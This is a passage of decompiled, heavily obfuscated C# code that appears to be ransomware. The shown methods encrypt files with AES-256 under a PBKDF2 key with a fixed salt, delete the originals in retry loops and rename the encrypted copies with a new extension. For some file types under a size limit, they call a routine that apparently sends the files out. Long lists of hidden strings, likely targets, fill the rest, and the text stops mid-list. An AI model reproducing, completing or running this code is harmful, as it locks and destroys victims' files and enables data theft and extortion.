						else if (!TOGjrVUqPLyQO)
						{
							if (!RoDeoCKBnUdhS)
							{
								NUBwAswciLFT(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + QJcgVBxUsCEC.getString_0(107392225), PbrXnMMGEpFUDsS);
							}
							else
							{
								NUBwAswciLFT(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + QJcgVBxUsCEC.getString_0(107392225), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!RoDeoCKBnUdhS)
								{
									VMoTmzztMnQLt(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt, PbrXnMMGEpFUDsS);
								}
								else
								{
									VMoTmzztMnQLt(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (zObGGMIceXoVAZ)
								{
									try
									{
										File.AppendAllText(nzrzeINFdi, QJcgVBxUsCEC.getString_0(107392994) + CS_0024_003C_003E8__locals0.oDbjaiuffOt + QJcgVBxUsCEC.getString_0(107392248) + ex8.Message + QJcgVBxUsCEC.getString_0(107396608));
									}
									catch (Exception)
									{
									}
								}
								ZKtLKJvwOV++;
								return;
							}
						}
						if (RoDeoCKBnUdhS)
						{
							if (CS_0024_003C_003E8__locals0.FYzxAexoqJ != QJcgVBxUsCEC.getString_0(107392230))
							{
								NebQHReckdpj(CS_0024_003C_003E8__locals0.oDbjaiuffOt + CS_0024_003C_003E8__locals0.FYzxAexoqJ, bytes2);
							}
							else
							{
								NebQHReckdpj(CS_0024_003C_003E8__locals0.oDbjaiuffOt, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			CS_0024_003C_003E8__locals0.jeTEtaMYQQ.Remove(CS_0024_003C_003E8__locals0.oDbjaiuffOt);
		});
	}

	private static void FcZiYHRxZD(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (rfxQznDDZcfw == getString_0(107396765))
					{
						foreach (string item in hVXoeTbUUaWy)
						{
							if (string_0.ToLower().EndsWith(item) && nPOfuoWjdBEJXWdYO == getString_0(107396765))
							{
								if (Convert.ToInt32(YPZutdATMurXqcQ) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394693), getString_0(107394688), getString_0(107395155), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && nPOfuoWjdBEJXWdYO == getString_0(107396770))
							{
								try
								{
									OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394693), getString_0(107394688), getString_0(107395155), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107392208)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107392208), getString_0(107395092)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void VMoTmzztMnQLt(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (rfxQznDDZcfw == getString_0(107396765))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in hVXoeTbUUaWy)
			{
				if (string_0.ToLower().EndsWith(item) && nPOfuoWjdBEJXWdYO == getString_0(107396765))
				{
					if (Convert.ToInt32(YPZutdATMurXqcQ) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394693), getString_0(107394688), getString_0(107395155), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && nPOfuoWjdBEJXWdYO == getString_0(107396770))
				{
					try
					{
						OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394693), getString_0(107394688), getString_0(107395155), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = nzCLlPCHXLqP.HSujbXnDcqZ(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		ECVrzbpNTQco++;
	}

	private static void NUBwAswciLFT(string string_0, string string_1, byte[] byte_0)
	{
		ubLNeoZDotnmG CS_0024_003C_003E8__locals0 = new ubLNeoZDotnmG();
		CS_0024_003C_003E8__locals0.RPXomsJlLYxsvlMK = string_0;
		CS_0024_003C_003E8__locals0.OjDIrXMUzyfG = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string ojDIrXMUzyfG = CS_0024_003C_003E8__locals0.OjDIrXMUzyfG;
			FileStream fileStream = new FileStream(ojDIrXMUzyfG, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (VvpOdAIUVnqJzW == getString_0(107396765))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.RPXomsJlLYxsvlMK, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.RPXomsJlLYxsvlMK, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.RPXomsJlLYxsvlMK, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.OjDIrXMUzyfG.Length > 0)
				{
					if (rfxQznDDZcfw == getString_0(107396765))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.RPXomsJlLYxsvlMK, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in hVXoeTbUUaWy)
						{
							if (CS_0024_003C_003E8__locals0.RPXomsJlLYxsvlMK.ToLower().EndsWith(item) && nPOfuoWjdBEJXWdYO == getString_0(107396765))
							{
								if (Convert.ToInt32(YPZutdATMurXqcQ) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394693), getString_0(107394688), getString_0(107395155), CS_0024_003C_003E8__locals0.RPXomsJlLYxsvlMK);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.RPXomsJlLYxsvlMK.ToLower().EndsWith(item) && nPOfuoWjdBEJXWdYO == getString_0(107396770))
							{
								try
								{
									OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394693), getString_0(107394688), getString_0(107395155), CS_0024_003C_003E8__locals0.RPXomsJlLYxsvlMK);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.RPXomsJlLYxsvlMK);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.OjDIrXMUzyfG.EndsWith(getString_0(107392208)))
					{
						File.Move(CS_0024_003C_003E8__locals0.OjDIrXMUzyfG, CS_0024_003C_003E8__locals0.OjDIrXMUzyfG.Replace(getString_0(107392208), getString_0(107395092)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.OjDIrXMUzyfG))
							{
								File.Delete(CS_0024_003C_003E8__locals0.OjDIrXMUzyfG);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (zObGGMIceXoVAZ)
			{
				try
				{
					File.AppendAllText(nzrzeINFdi, getString_0(107392977) + CS_0024_003C_003E8__locals0.RPXomsJlLYxsvlMK + getString_0(107392231) + ex2.Message + getString_0(107396591));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> jKOJEVchMLNdwO = JKOJEVchMLNdwO;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				abIlhrbbxQowQH(getString_0(107392146), string_0);
			};
		}
		Parallel.ForEach(jKOJEVchMLNdwO, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> mnlfjMRAEDLqxPS = MnlfjMRAEDLqxPS;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				abIlhrbbxQowQH(getString_0(107392169), string_0);
			};
		}
		Parallel.ForEach(mnlfjMRAEDLqxPS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> hEYpTuOcBu = HEYpTuOcBu;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107392156)), string_0);
			};
		}
		Parallel.ForEach(hEYpTuOcBu, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		if (tttsZxnASxs == getString_0(107396765))
		{
			string[] source = lgYFuyThGznQIqR;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107392156)), getString_0(107392131) + string_0 + getString_0(107392602));
				};
			}
			Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		if (!KqilAqOxbJnylCSb().Contains(getString_0(107392363)))
		{
			PdIlhbisPmBHZ(JrEMVbiIdsnWGMh);
		}
		else
		{
			List<string> pLOLJYWeMWGpM = PLOLJYWeMWGpM;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					abIlhrbbxQowQH(KfBmpaPpRy(oskmnSWYALtpc(getString_0(107392597))), string_0);
				};
			}
			Parallel.ForEach(pLOLJYWeMWGpM, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		List<string> tvdQhUAZHUpp = TvdQhUAZHUpp;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107392604)), string_0);
			};
		}
		Parallel.ForEach(tvdQhUAZHUpp, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> source2 = jQsJEYgqnYfva;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				abIlhrbbxQowQH(getString_0(107392587), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		abIlhrbbxQowQH(getString_0(107392146), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		abIlhrbbxQowQH(getString_0(107392169), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107392156)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107392156)), getString_0(107392131) + string_0 + getString_0(107392602));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		abIlhrbbxQowQH(KfBmpaPpRy(oskmnSWYALtpc(getString_0(107392597))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		abIlhrbbxQowQH(KfBmpaPpRy(getString_0(107392604)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		abIlhrbbxQowQH(getString_0(107392587), string_0);
	}

	static AFNAiOPxfKG()
	{
		Strings.CreateGetStringDelegate(typeof(AFNAiOPxfKG));
		uWFvpRMRVQI = getString_0(107395068);
		PbrXnMMGEpFUDsS = null;
		mHhRadxeyhbcW = getString_0(107396770);
		MOZyLSAyVmBVtUMu = getString_0(107392578);
		AVtexYHLTL = new List<string>();
		DwCgnVKtlvbbh = new List<string>();
		GcgKdRtBNfYo = getString_0(107396770);
		cCZPkZyYefOPII = getString_0(107395092);
		lhmVFsEfZqBVvrv = getString_0(107395092);
		ehmLJtnXYxYzJ = getString_0(107396770);
		FHnNdGQfMfZLQ = 0;
		HgiayPeKZIFbQY = getString_0(107396770);
		OnbGhlCpdM = getString_0(107396770);
		NZwBvHLOph = getString_0(107396770);
		RhKffUzShDrwT = getString_0(107392533);
		QrPovEgHgdDTosS = getString_0(107396770);
		MvNSnhedoPzREp = getString_0(107396770);
		FPJcVMshPit = getString_0(107396770);
		ezaaqHOMpUba = getString_0(107396770);
		gZeepLCxldrKjy = new List<string>
		{
			KfBmpaPpRy(getString_0(107392528)),
			KfBmpaPpRy(getString_0(107392543)),
			KfBmpaPpRy(getString_0(107392518)),
			KfBmpaPpRy(getString_0(107392469)),
			KfBmpaPpRy(getString_0(107392476)),
			KfBmpaPpRy(getString_0(107392451)),
			KfBmpaPpRy(getString_0(107392402)),
			KfBmpaPpRy(getString_0(107392377)),
			KfBmpaPpRy(getString_0(107392384)),
			KfBmpaPpRy(getString_0(107391847)),
			KfBmpaPpRy(getString_0(107391798)),
			KfBmpaPpRy(getString_0(107391805)),
			KfBmpaPpRy(getString_0(107391780))
		};
		CarZQGMNGUm = new List<string>();
		NQSIcXgsfxwP = getString_0(107396770);
		LEnjOQhiZianv = getString_0(107396770);
		yPwnUxlbvglN = getString_0(107396770);
		WBtfQTDigGvEr = new List<string>();
		olfcnDyKkIf = getString_0(107396770);
		taIcriAzbBhMzV = getString_0(107391755);
		vRguZFjQqPE = getString_0(107396770);
		hKDgHkPtCfE = getString_0(107396770);
		MnlfjMRAEDLqxPS = new List<string>
		{
			KfBmpaPpRy(getString_0(107391674)),
			KfBmpaPpRy(getString_0(107391641)),
			KfBmpaPpRy(getString_0(107391608)),
			KfBmpaPpRy(getString_0(107392087)),
			KfBmpaPpRy(getString_0(107392054)),
			KfBmpaPpRy(getString_0(107392025)),
			KfBmpaPpRy(getString_0(107392000)),
			KfBmpaPpRy(getString_0(107391971)),
			KfBmpaPpRy(getString_0(107391894)),
			KfBmpaPpRy(getString_0(107391317)),
			KfBmpaPpRy(getString_0(107391284)),
			KfBmpaPpRy(getString_0(107391251)),
			KfBmpaPpRy(getString_0(107391218)),
			KfBmpaPpRy(getString_0(107391189)),
			KfBmpaPpRy(getString_0(107391160)),
			KfBmpaPpRy(getString_0(107391119)),
			KfBmpaPpRy(getString_0(107391110)),
			KfBmpaPpRy(getString_0(107391533)),
			KfBmpaPpRy(getString_0(107391516)),
			KfBmpaPpRy(getString_0(107391451)),
			KfBmpaPpRy(getString_0(107391454)),
			KfBmpaPpRy(getString_0(107391381)),
			KfBmpaPpRy(getString_0(107391340)),
			KfBmpaPpRy(getString_0(107390827)),
			KfBmpaPpRy(getString_0(107390746)),
			KfBmpaPpRy(getString_0(107390721)),
			KfBmpaPpRy(getString_0(107390648)),
			KfBmpaPpRy(getString_0(107390619)),
			KfBmpaPpRy(getString_0(107390578)),
			KfBmpaPpRy(getString_0(107391033)),
			KfBmpaPpRy(getString_0(107390968)),
			KfBmpaPpRy(getString_0(107390943)),
			KfBmpaPpRy(getString_0(107390878)),
			KfBmpaPpRy(getString_0(107390285)),
			KfBmpaPpRy(getString_0(107390220)),
			KfBmpaPpRy(getString_0(107390163)),
			KfBmpaPpRy(getString_0(107390130)),
			KfBmpaPpRy(getString_0(107390121)),
			KfBmpaPpRy(getString_0(107390080)),
			KfBmpaPpRy(getString_0(107390515)),
			KfBmpaPpRy(getString_0(107390486)),
			KfBmpaPpRy(getString_0(107390421)),
			KfBmpaPpRy(getString_0(107390380)),
			KfBmpaPpRy(getString_0(107390379)),
			KfBmpaPpRy(getString_0(107390338)),
			KfBmpaPpRy(getString_0(107389745)),
			KfBmpaPpRy(getString_0(107389732)),
			KfBmpaPpRy(getString_0(107389627)),
			KfBmpaPpRy(getString_0(107389582)),
			KfBmpaPpRy(getString_0(107389569)),
			KfBmpaPpRy(getString_0(107390004)),
			KfBmpaPpRy(getString_0(107389995)),
			KfBmpaPpRy(getString_0(107389922)),
			KfBmpaPpRy(getString_0(107389893)),
			KfBmpaPpRy(getString_0(107389852)),
			KfBmpaPpRy(getString_0(107389243)),
			KfBmpaPpRy(getString_0(107389198)),
			KfBmpaPpRy(getString_0(107389169)),
			KfBmpaPpRy(getString_0(107389156)),
			KfBmpaPpRy(getString_0(107389091)),
			KfBmpaPpRy(getString_0(107389062)),
			KfBmpaPpRy(getString_0(107389485)),
			KfBmpaPpRy(getString_0(107389420)),
			KfBmpaPpRy(getString_0(107389411)),
			KfBmpaPpRy(getString_0(107389382)),
			KfBmpaPpRy(getString_0(107389341)),
			KfBmpaPpRy(getString_0(107388716)),
			KfBmpaPpRy(getString_0(107388655)),
			KfBmpaPpRy(getString_0(107388614)),
			KfBmpaPpRy(getString_0(107388537)),
			KfBmpaPpRy(getString_0(107389016)),
			KfBmpaPpRy(getString_0(107388975)),
			KfBmpaPpRy(getString_0(107388930)),
			KfBmpaPpRy(getString_0(107388853)),
			KfBmpaPpRy(getString_0(107388796)),
			KfBmpaPpRy(getString_0(107388235)),
			KfBmpaPpRy(getString_0(107388174)),
			KfBmpaPpRy(getString_0(107388165)),
			KfBmpaPpRy(getString_0(107388100)),
			KfBmpaPpRy(getString_0(107388019)),
			KfBmpaPpRy(getString_0(107388474)),
			KfBmpaPpRy(getString_0(107388441)),
			KfBmpaPpRy(getString_0(107388412)),
			KfBmpaPpRy(getString_0(107388355)),
			KfBmpaPpRy(getString_0(107390163)),
			KfBmpaPpRy(getString_0(107388298)),
			KfBmpaPpRy(getString_0(107387745)),
			KfBmpaPpRy(getString_0(107387656)),
			KfBmpaPpRy(getString_0(107387579)),
			KfBmpaPpRy(getString_0(107387550)),
			KfBmpaPpRy(getString_0(107387525)),
			KfBmpaPpRy(getString_0(107387960)),
			KfBmpaPpRy(getString_0(107387943)),
			KfBmpaPpRy(getString_0(107391033)),
			KfBmpaPpRy(getString_0(107387878)),
			KfBmpaPpRy(getString_0(107387837)),
			KfBmpaPpRy(getString_0(107387780)),
			KfBmpaPpRy(getString_0(107390968)),
			KfBmpaPpRy(getString_0(107387163)),
			KfBmpaPpRy(getString_0(107387146)),
			KfBmpaPpRy(getString_0(107387025)),
			KfBmpaPpRy(getString_0(107387472)),
			KfBmpaPpRy(getString_0(107387455)),
			KfBmpaPpRy(getString_0(107390878)),
			KfBmpaPpRy(getString_0(107387346)),
			KfBmpaPpRy(getString_0(107390130)),
			KfBmpaPpRy(getString_0(107390285)),
			KfBmpaPpRy(getString_0(107387313)),
			KfBmpaPpRy(getString_0(107387256)),
			KfBmpaPpRy(getString_0(107390220)),
			KfBmpaPpRy(getString_0(107386711)),
			KfBmpaPpRy(getString_0(107386694)),
			KfBmpaPpRy(getString_0(107386613)),
			KfBmpaPpRy(getString_0(107390578)),
			KfBmpaPpRy(getString_0(107386620)),
			KfBmpaPpRy(getString_0(107386543)),
			KfBmpaPpRy(getString_0(107386514)),
			KfBmpaPpRy(getString_0(107386485)),
			KfBmpaPpRy(getString_0(107386984)),
			KfBmpaPpRy(getString_0(107386951)),
			KfBmpaPpRy(getString_0(107386894)),
			KfBmpaPpRy(getString_0(107386881)),
			KfBmpaPpRy(getString_0(107386856)),
			KfBmpaPpRy(getString_0(107386815)),
			KfBmpaPpRy(getString_0(107386738)),
			KfBmpaPpRy(getString_0(107386209)),
			KfBmpaPpRy(getString_0(107386152)),
			KfBmpaPpRy(getString_0(107386119)),
			KfBmpaPpRy(getString_0(107386042)),
			KfBmpaPpRy(getString_0(107386009)),
			KfBmpaPpRy(getString_0(107385968)),
			KfBmpaPpRy(getString_0(107390619)),
			KfBmpaPpRy(getString_0(107386209)),
			KfBmpaPpRy(getString_0(107386471)),
			KfBmpaPpRy(getString_0(107386442)),
			KfBmpaPpRy(getString_0(107386381)),
			KfBmpaPpRy(getString_0(107386364)),
			KfBmpaPpRy(getString_0(107386291)),
			KfBmpaPpRy(getString_0(107386230)),
			KfBmpaPpRy(getString_0(107385645)),
			KfBmpaPpRy(getString_0(107385616)),
			KfBmpaPpRy(getString_0(107385583)),
			KfBmpaPpRy(getString_0(107385542)),
			KfBmpaPpRy(getString_0(107385513)),
			KfBmpaPpRy(getString_0(107385468)),
			KfBmpaPpRy(getString_0(107385883)),
			KfBmpaPpRy(getString_0(107385850)),
			KfBmpaPpRy(getString_0(107385805)),
			KfBmpaPpRy(getString_0(107385744)),
			KfBmpaPpRy(getString_0(107385711)),
			KfBmpaPpRy(getString_0(107385186)),
			KfBmpaPpRy(getString_0(107385121)),
			KfBmpaPpRy(getString_0(107385088)),
			KfBmpaPpRy(getString_0(107385015)),
			KfBmpaPpRy(getString_0(107384998)),
			KfBmpaPpRy(getString_0(107390746)),
			KfBmpaPpRy(getString_0(107384969)),
			KfBmpaPpRy(getString_0(107385392)),
			KfBmpaPpRy(getString_0(107385383)),
			KfBmpaPpRy(getString_0(107385306)),
			KfBmpaPpRy(getString_0(107385265)),
			KfBmpaPpRy(getString_0(107385252)),
			KfBmpaPpRy(getString_0(107384679)),
			KfBmpaPpRy(getString_0(107384598)),
			KfBmpaPpRy(getString_0(107384581)),
			KfBmpaPpRy(getString_0(107384492)),
			KfBmpaPpRy(getString_0(107384435)),
			KfBmpaPpRy(getString_0(107384934)),
			KfBmpaPpRy(getString_0(107384893)),
			KfBmpaPpRy(getString_0(107384836)),
			KfBmpaPpRy(getString_0(107390721)),
			KfBmpaPpRy(getString_0(107384731)),
			KfBmpaPpRy(getString_0(107384734)),
			KfBmpaPpRy(getString_0(107384701)),
			KfBmpaPpRy(getString_0(107384116)),
			KfBmpaPpRy(getString_0(107384087)),
			KfBmpaPpRy(getString_0(107390827)),
			KfBmpaPpRy(getString_0(107384046)),
			KfBmpaPpRy(getString_0(107384029)),
			KfBmpaPpRy(getString_0(107384000)),
			KfBmpaPpRy(getString_0(107389062)),
			KfBmpaPpRy(getString_0(107383967)),
			KfBmpaPpRy(getString_0(107384000)),
			KfBmpaPpRy(getString_0(107383938)),
			KfBmpaPpRy(getString_0(107384421)),
			KfBmpaPpRy(getString_0(107384392)),
			KfBmpaPpRy(getString_0(107384311)),
			KfBmpaPpRy(getString_0(107384294)),
			KfBmpaPpRy(getString_0(107384253)),
			KfBmpaPpRy(getString_0(107384192)),
			KfBmpaPpRy(getString_0(107383651)),
			KfBmpaPpRy(getString_0(107383578)),
			KfBmpaPpRy(getString_0(107383533)),
			KfBmpaPpRy(getString_0(107383520)),
			KfBmpaPpRy(getString_0(107383487)),
			KfBmpaPpRy(getString_0(107383430)),
			KfBmpaPpRy(getString_0(107383865)),
			KfBmpaPpRy(getString_0(107383840)),
			KfBmpaPpRy(getString_0(107383807)),
			KfBmpaPpRy(getString_0(107383734)),
			KfBmpaPpRy(getString_0(107383705)),
			KfBmpaPpRy(getString_0(107383676)),
			KfBmpaPpRy(getString_0(107383099)),
			KfBmpaPpRy(getString_0(107383074)),
			KfBmpaPpRy(getString_0(107383001)),
			KfBmpaPpRy(getString_0(107382984)),
			KfBmpaPpRy(getString_0(107382951)),
			KfBmpaPpRy(getString_0(107383382)),
			KfBmpaPpRy(getString_0(107383369)),
			KfBmpaPpRy(getString_0(107383288)),
			KfBmpaPpRy(getString_0(107383275)),
			KfBmpaPpRy(getString_0(107383194)),
			KfBmpaPpRy(getString_0(107383161)),
			KfBmpaPpRy(getString_0(107382608)),
			KfBmpaPpRy(getString_0(107382599)),
			KfBmpaPpRy(getString_0(107382522)),
			KfBmpaPpRy(getString_0(107386291)),
			KfBmpaPpRy(getString_0(107382489)),
			KfBmpaPpRy(getString_0(107382448)),
			KfBmpaPpRy(getString_0(107382391)),
			KfBmpaPpRy(getString_0(107382874)),
			KfBmpaPpRy(getString_0(107382841)),
			KfBmpaPpRy(getString_0(107382808)),
			KfBmpaPpRy(getString_0(107382791)),
			KfBmpaPpRy(getString_0(107382762)),
			KfBmpaPpRy(getString_0(107382717)),
			KfBmpaPpRy(getString_0(107382640)),
			KfBmpaPpRy(getString_0(107382119)),
			KfBmpaPpRy(getString_0(107382030)),
			KfBmpaPpRy(getString_0(107382013)),
			KfBmpaPpRy(getString_0(107381984)),
			KfBmpaPpRy(getString_0(107381907))
		};
		JKOJEVchMLNdwO = new List<string>
		{
			KfBmpaPpRy(getString_0(107381898)),
			KfBmpaPpRy(getString_0(107382329)),
			KfBmpaPpRy(getString_0(107382312)),
			KfBmpaPpRy(getString_0(107382231)),
			KfBmpaPpRy(getString_0(107382214)),
			KfBmpaPpRy(getString_0(107382149)),
			KfBmpaPpRy(getString_0(107381528)),
			KfBmpaPpRy(getString_0(107381467))
		};
		HEYpTuOcBu = new List<string>
		{
			KfBmpaPpRy(getString_0(107381442)),
			KfBmpaPpRy(getString_0(107381409)),
			KfBmpaPpRy(getString_0(107381844)),
			KfBmpaPpRy(getString_0(107381827)),
			KfBmpaPpRy(getString_0(107381794)),
			KfBmpaPpRy(getString_0(107381713)),
			KfBmpaPpRy(getString_0(107381700)),
			KfBmpaPpRy(getString_0(107381667)),
			KfBmpaPpRy(getString_0(107381634)),
			KfBmpaPpRy(getString_0(107381089)),
			KfBmpaPpRy(getString_0(107381056)),
			KfBmpaPpRy(getString_0(107381023)),
			KfBmpaPpRy(getString_0(107380950)),
			KfBmpaPpRy(getString_0(107380909)),
			KfBmpaPpRy(getString_0(107380896)),
			KfBmpaPpRy(getString_0(107380863)),
			KfBmpaPpRy(getString_0(107381302)),
			KfBmpaPpRy(getString_0(107381269)),
			KfBmpaPpRy(getString_0(107381228)),
			KfBmpaPpRy(getString_0(107381219)),
			KfBmpaPpRy(getString_0(107381186)),
			KfBmpaPpRy(getString_0(107381113)),
			KfBmpaPpRy(getString_0(107413336)),
			KfBmpaPpRy(getString_0(107381442)),
			KfBmpaPpRy(getString_0(107413295)),
			KfBmpaPpRy(getString_0(107413286)),
			KfBmpaPpRy(getString_0(107413209)),
			KfBmpaPpRy(getString_0(107413176)),
			KfBmpaPpRy(getString_0(107413135)),
